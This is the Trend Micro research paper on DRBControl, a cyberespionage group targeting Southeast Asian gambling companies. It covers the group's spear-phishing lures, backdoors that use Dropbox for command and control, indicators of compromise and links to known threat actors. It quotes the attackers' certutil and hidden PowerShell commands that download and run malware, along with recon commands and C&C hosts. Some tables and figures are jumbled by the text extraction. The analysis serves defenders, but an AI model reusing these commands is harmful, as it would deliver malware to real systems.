Uncovering DRBControl Inside the Cyberespionage Campaign Targeting Gambling OperationsDaniel Lunghi, Cedric Pernet, Kenney Lu, and Jamz YanezaContents4 The Initial Compromise: Other Malware Families Used21 Post-Exploitation Tools22 Infrastructure Analysis24 Links with Known Threat Actors26 ConclusionPublished by Trend Micro ResearchWritten by Daniel Lunghi, Cedric Pernet, Kenney Lu, and Jamz YanezaStock image used under license from Shutterstock.comIn the summer of 2019, Talent-Jump Technologies, Inc. contacted Trend Micro regarding a backdoor that they discovered after performing an incident response operation on a company based in the Philippines. Trend Micro provided further intelligence and context on this particular backdoor. An in-depth analysis revealed that the backdoor was being used by an advanced persistent threat (APT) actor that we dubbed “DRBControl,” as we could not find anything related to the group in our databases or public malware repositories.Our analysis also found that the threat actor uses a number of additional backdoors and post-exploitation tools, as well as some spear-phishing documents that could have been used during the initial phase of a related campaign. One of the backdoors was of particular interest, as it used the file hosting service Dropbox as a command-and-control (C&C) channel. We shared our analysis with Dropbox, which has since been working with Trend Micro regarding the issues.We observed that the threat actor behind this campaign had very specific targets, as it only goes after gambling and betting companies in Southeast Asia. We have been made aware that Europe and the Middle East regions are also being targeted, but we could not confirm this information at the time of writing. The exfiltrated data was mostly comprised of databases and source codes, which leads us to believe that the campaign is used for cyberespionage or gaining competitive intelligence. Some of the backdoors were unknown to us, which could suggest that it is a previously unreported group. However, we also managed to link it to some known threat actors.This research paper details the different stages of this campaign, including the initial spear-phishing emails, a detailed analyses of the backdoors, and a list of the multiple post-exploitation tools. It also covers observations on the threat actor’s activities and infrastructure, including connections with known APTgroups.The Initial Compromise: Spear PhishingIn targeted attacks, spear phishing is a common infection vector employed1 by threat actors2 looking togain an initial foothold in their target’s infrastructure. Getting the targets’ email addresses is relatively easy,using generic email addresses or specific individuals’ email addresses. The campaign we expose in thisresearch is not an exception: The threat actors use spear phishing to trick the recipient into opening a.DOCX document.The spear-phishing campaign we witnessed was active in May 2019. We could find two different (in termsof language) — but very similar — kinds of phishing content. The social engineering used in this campaignappears to be quite straightforward and efficient in terms of meeting the threat actors’ goals.The threat actor’s spear-phishing attack targets the organization’s support team.From: 2931436431@{BLOCKED}q[.]comTo: support-<redacted>@<redacted>The subject changed depending on the language that the targeted support team uses. The support- cn team, for instance, received an email with the Chinese subject “注册不了的截图” (“cannot register screenshot”), while the support-jp team received a similar email with “error screenshot” as the subject.Moreover, documents are displayed differently.Figure 1. Spear-phishing document sent to the Japanese support team4 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling OperationsFigure 2. Spear-phishing document sent to the Chinese support teamSupport teams are used to receiving requests from customers, and emails that contain screen capturesfrom users may also be commonplace for these teams. However, support teams should be wary of howunusual it could be for a user to send a .DOCX file that contains the screenshot, which requires additionaluser action (a double-click, in this case) only to show the image.We were able to find at least three different versions of the infecting documents. The first version, whendouble-clicked by the user, embeds an executable file that is launched and acts as a dropper for themalware (detected by Trend Micro as Trojan.Win32.CLAMBLING.A).A second version of the document embeds a .BAT file, which also acts as a downloader for the samemalware.cd %temp% && certutil -urlcache -split -f http://{BLOCKED}.{BLOCKED}.18.154/debug.exe&&debug.exeCommand-line content found in an infecting document, downloading and executing a second-stage malwareThe third version of the document uses PowerShell to download the malware.cmd /c start powershell.exe -ep Bypass -NoP -NonI -W Hidden (new-object System.Net.WebClient).DownloadFile(‘http://{BLOCKED}.{BLOCKED}.18.154/test.cab’,’%TEMP%\\test.cab’); expand ‘%temp%\\test.cab’ %temp% -f:* ;Start-Process ‘%TEMP%\\config.exe’Using PowerShell to download and execute a second-stage malwareOur analysis revealed that the first two versions execute the same file (detected as Trojan.Win32.CLAMBLING.A) on the infected system. We could not retrieve the test.cab file from the third version, butwe suspect a similar final payload.5 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling OperationsFigure 3. Malicious document that tricks the user to double-click on the picture and run malicious code(top: “Registration information error picture” bottom: “Double-click to enlarge picture”)We also found a weaponized document from July 2017 that used a similar PowerShell code to dropa backdoor (analyzed later in this research as type 2), but we could not search for it in our telemetry.Similarly, it also tricked the user into double-clicking on an image, which triggers the code execution.6 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling OperationsMalware AnalysisThis campaign uses two major backdoors that were previously unknown to us. We also found someknown malware families such as PlugX and HyperBro, as well as many custom post-exploitation tools.Below we describe the loading, persistence, and features of the two backdoors.Type 1 BackdoorLoading the PayloadThis backdoor is written in the C++ language with classes that inherit from virtual classes. The backdooris also modular, allowing for expansion with the use of plugins.Current Method: DLL Side-LoadingTo load this backdoor, the threat actor launches the legitimate file MsMpEng.exe, which is signed byMicrosoft and described as an “Antimalware Service Executable.” This executable is vulnerable to DLLside-loading,3 wherein an unintended DLL is loaded on a program. In this case, the malicious actortakes advantage of it by storing a file named mpsvc.dll in the same directory. That DLL then opensa third filename, mpsvc.mui, which contains the obfuscated backdoor, decodes it, and loads it into asvchost.exe process.We found two RAR archive files (detected as Trojan.Win64.CLAMBLING.A) in the wild containing theaforementioned files. The modification time of the embedded files is 2019-07-25.Old Method: Patching of a Legitimate FileInterestingly, we observed a different technique being used in an older version of this backdoor. The threatactor manually patched some bytes of a legitimate installer for the Chinese archiving software “HaoZip,”(commonly used in China as an alternative to WinRAR and WinZip) to redirect the code flow to a functionappended at the end of the binary.7 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling OperationsFigure 4. Legitimate HaoZip installer codeFigure 5. Patched code that redirects the execution flowThe added function resolves some pointers to several WinAPI functions by comparing them to a hashgenerated via a simple custom algorithm. The code then loads into memory the binary overlay, whichcontains a routine to decompress and load the final payload. The routine also checks if the process isbeing debugged by comparing the third bit of the PEB with 0.8 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling OperationsFigure 6. Debugger check via PEBBackdoor FeaturesThe dropped payload is a backdoor written in C++. It embeds a configuration file in clear text that containsthe C&C, the path where the file will be copied, and the service name that will be created.If no arguments are provided, the file is copied to the path specified in the configuration, its attributes areset to the system and hidden, and a value is added to a “Run” registry key to launch it during the nextboot.Figure 7. AutoRun additionIt handles the following arguments:• P: Create a suspended svchost.exe process, inject code, and resume• O: Initialize plug-ins and backdoor features• U: Bypass user account control (UAC) with passuac.dll fileRun-time type information (RTTI) is present in the executable, allowing us to obtain the real classes’names:• CHPPlugin: Virtual class implemented by every “plug-in” class• CHPCmd: Class handling command execution through the terminal• CHPExplorer: Class providing functions to browse directories, enumerate network shares, read, write,and execute files• CHPAvi: Class providing recording of the screen content in AVI format and AVI files enumeration• CHPKeyLog: Class providing keylogging feature (discussed later)• CHPPipe: Class providing functions that handle named pipes9 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations• CHPProcess: Class providing functions to enumerate and terminate processes• CHPProxy: Class adding proxy support• CHPRegedit: Class providing functions to handle registry keys (enumerate, copy, set, delete)• CHPScreen: Class handling screenshot capture feature• CHPService: Class providing functions to handle services (create, delete, modify, query, start)• CHPNet: Virtual class implemented by every “communication protocol” class• CHPHttp: Network class related to HTTP protocol handling• CHPTcp: Network class related to TCP protocol handling• CHPUdp: Network class related to UDP protocol handling• CHPTelnet: Network class related to Telnet protocol handlingThe malware also sends the infected system’s information (listed below) to the C&C server:• Hostname (or IP address if no hostname is found)• Computer name• Current privileges (System/Admin/User)• Windows version• Current time• Fixed string (likely the campaign identifier)Before sending the information, the data is obfuscated by swapping each character with its position in afixed substitution table.Figure 8. Substitution algorithm10 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling OperationsThe Use of Dropbox in Its Infection ChainAn important feature appeared in the recent version of this backdoor: A new thread that adds a new C&Cchannel by using the Dropbox API. The thread waits 30 minutes before doing anything, then gathers thefollowing information about the host:• Local IP address• Computer name• Username• Operating system (OS) version• Malware version (fixed string; we saw values ranging from 1.0 to 9.0)• Content of the registry key: HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt\strDataDir +“wallet.dat”• Existence: “YES” if the wallet file exists, “NO” if otherwiseThis information is written in plain text to Dropbox by using the API in a file named with the current dateand time. The malware then searches for a file named bin.asc in a specific Dropbox directory. If this fileexists, the malware checks if it starts with “GIF” then decrypts the rest of it, starts a suspended svchost.exe process, writes the decrypted shellcode to it, and resumes its execution.We found different payloads being delivered through Dropbox that will be covered in a separate sectionbelow. It is worth noting that the threat actor used multiple Dropbox repositories, each one storing differentinformation. They were split as the following:• Backdoor and storage of target user’s workstation information• Storage of commands, results, heartbeats, and post-exploitation tools• Stolen files from target user’s computerThe versioning shows the malware’s rapid pace of development — Version 1.0 was used in late May 2019,version 8.0 in late July 2019, and version 9.0 at the beginning of October 2019.11 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling OperationsWinDRM/FirewallStartEnter side-loadingDLLUnpack loader inmemoryLoad MUI ﬁle tomemoryExecute unpack loadin MUI ﬁleStart svchost.exe and inject DLLsvchostStartsvchost (second channel)Connect to C&CWait for commandInformation gatheringUpload info toDropboxCheck DropboxpayloadFoundStart svchost.exe occurrencesnetstat -anotasklistsysteminfoquery useripconfig /allwhoamireg query “HKEY_CURRENT_USER\Software\ Microsoft\Terminal Server Client\Default”dir wlbsctrl.dlltype log.txtset24191918161512111010Table 1. Top 10 commands issued by DRBControl through “cmd /c”Of the 51 files that the attacker deleted, the majority were post-exploitation tools. Notably, in two cases,the attacker deleted the file c:\ProgramData\SxS\NvSmart.hlp, which is known to contain keylogginginformation generated by the PlugX malware. All of the downloaded files were post-exploitation tools.Among the uploaded files, there were many Office and PDF documents, key logs, SQL dumps, browsercookies, and even a KeePass database. Another interesting note is that the download and uploadcommands included the remote file path as an argument, which allowed us to see how the attackerorganizes its files.Some parent directories from which the attacker copied the stolen files were interesting: “C:\Projects\Dropbox\Test Version\DRBControl\Release\Downloads\”, or “C:\Users\Win2008_x64\Desktop\drb\Downloads\”. The attacker would then create a directory structure of “[ <victim’s IP address> ]\[ <victim’sID> ]+[ <username> ]\<stolen file path>” or “<Victim’s ID>(<computer name>)\<stolen file path>”. Some of the attacker’s directory names contained Chinese words, such as “备份” (“backup”) and “UAC 提权” www.betwln520[.]com:110download.safedog[.]co:80 download.safedog[.]co:443%ALLUSERSPROFILE%\Update\ update.exewuau%ALLUSERSPROFILE%\download\ SKTest.exedownloadN/AN/Atest66.shopingchina[.]net:80%ALLUSERSPROFILE%\S\s.exegoogleupdate587694update.google.com.updatesrvers[.]org:80%ALLUSERSPROFILE%\google\ safe.mircosofdevice[.]com:53 safe.mircosofdevice[.]com:5000office.support.googldevice[.]com:8080 office.support.googldevice[.]com:53 office.support.googldevice[.]com:5000office.support.googldevice[.]com:80 office.support.googldevice[.]com:53 office.support.googldevice[.]com:5000%ALLUSERSPROFILE%\Microsoft\ DRM\Server\WinDRM.exeWinDRM1234568.0%SystemRoot%\system32\sysprep\ RSoPProv.exeRSoPProv1234568.0%ALLUSERSPROFILE%\Firewall\ Firewall.exeFirewall1234568.0safe.mircosofdevice[.]com:53 safe.mircosofdevice[.]com:5000%ALLUSERSPROFILE%\Microsoft\ 45.77.41[.]49:53 45.77.41[.]49:500office.support.googldevice[.]com:8080 office.support.googldevice[.]com:53 office.support.googldevice[.]com:5000office.support.googldevice[.]com:80 office.support.googldevice[.]com:53 office.support.googldevice[.]com:5000office.support.googldevice[.]com:80 office.support.googldevice[.]com:53 office.support.googldevice[.]com:5000office.support.googldevice[.]com:80 office.support.googldevice[.]com:53 office.support.googldevice[.]com:500035.220.232[.]71:53 35.220.232[.]71:554%SystemRoot%\system32\drivers\ UMDF\RSoPProv.exeRSoPProv1234568.0C:\Windows\system32\rsoplicy.exeRSoPProv1234568.0%SystemRoot%\system32\sysprep\ RSoPProv.exeRSoPProv1234568.0%SystemRoot%\system32\sysprep\ RSoPProv.exeRSoPProv1234568.0%SystemRoot%\system32\sysprep\ update.mircosoftdefender[.]com:30update.mircosoftdefender[.]com:80 update.mircosoftdefender[.]com:443store.microsoftbetastore[.]com:443 store.microsoftbetastore[.]com:8080Type 3Service POWERSTATS V3 and New Post-Exploitation Tools.” Last accessed on 20 January 2020 at url trendlabs-security-intelligence/muddywater-resurfaces-uses-multi-stage-backdoor-powerstats-v3-and-new-post-exploitation- tools/.2 Feike Hacquebord. (12 January 2018). Trend Micro. “Update on Pawn Storm: New Targets and Politically MotivatedCampaigns.” Last accessed on 20 January 2020 at url storm-new-targets-politically-motivated-campaigns/.3 The MITRE Corporation. (n.d.). MITRE ATT&CK. “DLL Side-Loading.” Last accessed on 20 January 2020 at url Dwight Hohnstein. (18 April 2019). SpecterOps. “Lateral Movement — SCM and DLL Hijacking Primer.” Last accessed on 20January 2020 at url Clément Labro. (5 October 2018). GitHub, Inc. “Windows IKEEXT DLL Hijacking Exploit Tool.” Last accessed on 22 January2020 at url (8 October 2012). ImmuniWeb. “Privilege Escalation Vulnerability in Microsoft Windows.” Last accessed on 23 January 2020 at url Lawrence Abrams. (15 November 2016). Bleeping Computer. “CryptoLuck Ransomware being Malvertised via RIG-E ExploitKits.” Last accessed on 23 January 2020 at url malvertised-via-rig-e-exploit-kits/.8 ThreatRecon Team. (25 July 2019). NSHC RedAlert Labs. “ The Growth of SectorF01 Group’s Cyber Espionage Activities.”Last accessed on 23 January 2020 at url activities/.9 Microsoft Corporation. (February 2015). Microsoft. “Cumulative Security Update for Internet Explorer 11 for Windows 7 forx64-based Systems (KB3021952).” Last accessed on 20 January 2020 at url aspx?id=45761.10 Trend Micro. (16 October 2019). Trend Micro Security News. “Winnti Group Resurfaces with PortReuse Backdoor, NowEngages in Illicit Cryptocurrency Mining.” Last accessed on 20 January 2020 at url news/cyber-attacks/winnti-group-resurfaces-with-portreuse-backdoor-now-engages-in-illicit-cryptocurrency-mining.11 The MITRE Corporation. (n.d.). MITRE ATT&CK. “HyperBro.” Last accessed on 20 January 2020 at url Robert Falcone. (28 May 2019). Palo Alto Networks, Inc. “Emissary Panda Attacks Middle East Government SharepointServers.” Last accessed on 20 January 2020 at url government-sharepoint-servers/.13 Rootkiter. (3 January 2019). GitHub, Inc. “Tool for tunnel.” Last accessed on 20 January 2020 at url My IP. (n.d.). My IP. Last accessed on 20 January 2020 at url MDSec Research. (7 December 2016). GitHub, Inc. “Invoke-CredHunter.ps1.” Last accessed on 20 January 2020 at url SecWiki. (31 July 2017). GitHub, Inc. “CVE-2017-0213.cpp.” Last accessed on 20 January 2020 at url BlackYe. (3 May 2014). GitHub, Inc. “ReadPsw.cpp.” Last accesed on 20 January 2020 at url Rapid7. (24 July 2017). GitHub, Inc. “ enum_cred_store.rb.” Last accessed on 20 January 2020 at url Clément Lavoillotte. (15 September 2017). Almond. “UAC bypass via elevated .NET applications.” Last accessed on 20January 2020 at url Rapid7. (28 February 2014). GitHub, Inc. “Win7Elevate_Inject.cpp.” Last accessed on 20 January 2020 at url | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations21 Matt Nelson. (15 August 2016). enigma0x3. “’Fileless’ UAC Bypass Using Eventvwr.Exe And Registry Hijacking.” Last accessedon 20 January 2020 at url Russell Nolen, Sarah Miller, and Rico Valdez. (28 April 2016). Carbon Black, Inc. “Threat Advisory: “Squiblydoo” ContinuesTrend of Attackers Using Native OS Tools to “Live off the Land”.” Last accessed 20 January 2020 at url com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/.23 Trend Micro. (19 April 2017). Trend Micro. “Of Pigs and Malware: Examining a Possible Member of the Winnti Group.” Lastaccessed on 20 January 2020 at url possible-member-winnti-group/.24 Tom Hegel. (3 May 2018). 401TRG. “Burning Umbrella: An Intelligence Report on the Winnti Umbrella and Associated State-Sponsored Attackers.” Last accessed on 20 January 2020 at url ClearSky Research Team. (18 July 2017). ClearSky Cyber Security. “Recent Winnti Infrastructure and Samples.” Last accessedon 20 January 2020 at url Denis Legezo. (13 June 2018). AO Kaspersky Lab. “LuckyMouse hits national data center to organize country-level waterholingcampaign.” Last accessed on 20 January 2020 at url Robert Falcone. (28 May 2019). Palo Alto Networks, Inc. “Emissary Panda Attacks Middle East Government SharepointServers.” Last accessed on 20 January 2020 at url government-sharepoint-servers/.28 Trend Micro Incorporated. (n.d.). Trend Micro. “Advanced Threat Protection.” Last accessed on 6 February 2020 at url Weimen Wu. (20 February 2015). Trend Micro. “Deploying a Smart Sandbox for Unknown Threats and Zero-Day Attacks.” Lastaccessed on 6 February 2020 at url unknown-threats-and-zero-day-attacks/.30 Jon Oliver. (12 July 2018). Trend Micro Security News. “Rising Above Spam and Other Threats via Machine Learning.” Lastaccessed on 6 February 2020 at url and-other-threats-via-machine-learning.31 Trend Micro Incorporated. (n.d.). Trend Micro. “Smart Protection Suites.” Last accessed on 6 February 2020 at url Trend Micro Incorporated. (n.d.). Trend Micro. “Worry-Free Services Advanced.” Last accessed on 6 February 2020 at url Trend Micro Incorporated. (n.d.). Trend Micro. “Advanced Threat Protection.” Last accessed on 6 February 2020 at url Trend Micro Incorporated. (n.d.). Trend Micro. “Hybrid Cloud Security.” Last accessed on 6 February 2020 at url Trend Micro Incorporated. (n.d.). Trend Micro. “Smart Protection Suites.” Last accessed on 6 February 2020 at url Trend Micro Incorporated. (n.d.). Trend Micro. “All Solutions.” Last accessed on 6 February 2020 at url Trend Micro Incorporated. (n.d.). Trend Micro. “Smart Protection Suites.” Last accessed on 6 February 2020 at url | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling OperationsTREND MICROTM RESEARCHTrend Micro, a global leader in cybersecurity, helps to make the world safe for exchanging digital information.Trend Micro Research is powered by experts who are passionate about discovering new threats, sharing key insights, and supporting efforts to stop cybercriminals. Our global team helps identify millions of threats daily, leads the industry in vulnerability disclosures, and publishes innovative research on new threat techniques. We continually work to anticipate new threats and deliver thought- provoking research.www.trendmicro.com 